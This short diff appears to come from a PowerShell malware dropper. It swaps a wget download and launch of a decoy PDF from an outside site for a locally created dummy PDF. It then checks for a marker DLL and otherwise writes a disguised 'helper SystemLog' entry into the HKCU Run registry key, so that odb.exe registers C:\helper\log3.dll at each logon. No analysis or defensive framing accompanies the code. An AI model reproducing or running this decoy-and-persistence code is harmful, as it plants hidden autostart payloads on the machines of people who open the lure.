@@ -1,4 +1,4 @@
-echo 1 > wget "https://kredivo.id/wp-content/uploads/2024/03/RIPLAY-ID-2024.pdf" -o $env:tmp\kredivo.pdf ; .$env:tmp\kredivo.pdf ;
+echo 1 > dokumen.pdf ; .\dokumen.pdf ;
 if (Test-Path C:\helper\log3.dll) { exit } 
 else { 
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "helper SystemLog" -Value 'C:\helper\odb.exe /a {REGSVR C:\helper\log3.dll}' -Force ;
